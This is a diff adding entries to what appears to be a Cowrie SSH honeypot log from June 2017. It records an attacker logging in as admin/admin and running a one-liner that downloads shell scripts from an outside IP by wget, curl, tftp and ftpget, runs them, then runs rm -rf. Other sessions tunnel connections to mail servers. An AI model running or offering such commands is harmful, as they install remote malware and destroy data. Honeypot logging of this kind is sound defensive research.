@@ -3980,3 +3980,76 @@
 2017-06-02T12:41:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1893,163.172.138.239] 'admin' trying auth 'password'
 2017-06-02T12:41:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1893,163.172.138.239] login attempt: 119
 2017-06-02T12:41:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1893,163.172.138.239] login return, expect: [admin/admin]
+2017-06-02T12:41:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1893,163.172.138.239] login attempt [admin/admin] succeeded
+2017-06-02T12:41:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1893,163.172.138.239] 'admin' authenticated with 'password'
+2017-06-02T12:41:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1893,163.172.138.239] starting service 'ssh-connection'
+2017-06-02T12:41:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] got channel 'session' request
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] channel open
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	"
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Opening TTY Log: log/tty/20170602-124105-44b97813-0e.log
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Command found: cd /tmp
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Command found: cd /var/run
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Command found: cd /mnt
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Command found: cd /root
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Command found: cd /
+2017-06-02T12:41:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] Command found: wget http://51.15.48.238/armex.sh
+2017-06-02T12:41:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-02T12:41:05+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-02T12:41:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 /armex.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: sh /armex.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get armexft.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: rm -rf /armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170602-124105-44b97813-0e.log after 0 seconds
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-02T12:41:05+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-02T12:41:05+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-02T12:41:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-02T12:41:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] direct-tcp connection request to 98.139.214.154:25 from localhost:5556
+2017-06-02T12:41:10+0000 [CowrieTelnetTransport,6992,176.123.10.214] Connection lost after 40 seconds
+2017-06-02T12:41:29+0000 [SSHChannel None (334) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] direct-tcp forward to 65.55.37.88:25 with data 'QUIT\r\n'
+2017-06-02T12:41:29+0000 [SSHChannel None (334) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] failed to connect: Connection refused
+2017-06-02T12:41:29+0000 [SSHChannel None (334) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] sending close 334
+2017-06-02T12:41:29+0000 [SSHChannel None (334) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] remote eof
+2017-06-02T12:41:29+0000 [SSHChannel None (334) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] remote close
+2017-06-02T12:41:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-02T12:41:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] direct-tcp connection request to 98.138.112.35:25 from localhost:5556
+2017-06-02T12:41:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1893,163.172.138.239] remote close
+2017-06-02T12:41:35+0000 [HoneyPotSSHTransport,1893,163.172.138.239] avatar admin logging out
+2017-06-02T12:41:35+0000 [HoneyPotSSHTransport,1893,163.172.138.239] connection lost
+2017-06-02T12:41:35+0000 [HoneyPotSSHTransport,1893,163.172.138.239] Connection lost after 34 seconds
+2017-06-02T12:41:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1830,91.230.47.77] got channel 'direct-tcpip' request
+2017-06-02T12:41:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1830,91.230.47.77] direct-tcp connection request to 216.32.181.234:25 from localhost:5556
+2017-06-02T12:41:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1830,91.230.47.77] got channel 'direct-tcpip' request
+2017-06-02T12:41:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1830,91.230.47.77] direct-tcp connection request to 54.194.154.238:587 from localhost:5556
+2017-06-02T12:41:51+0000 [CowrieTelnetTransport,6987,176.123.10.214] Closing TTY Log: log/tty/20170602-123942-None-6987i.log after 128 seconds
+2017-06-02T12:41:51+0000 [CowrieTelnetTransport,6987,176.123.10.214] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-02T12:41:51+0000 [CowrieTelnetTransport,6987,176.123.10.214] Connection lost after 137 seconds
+2017-06-02T12:42:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-02T12:42:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1828,91.195.103.183] direct-tcp connection request to 65.55.92.136:25 from localhost:5556
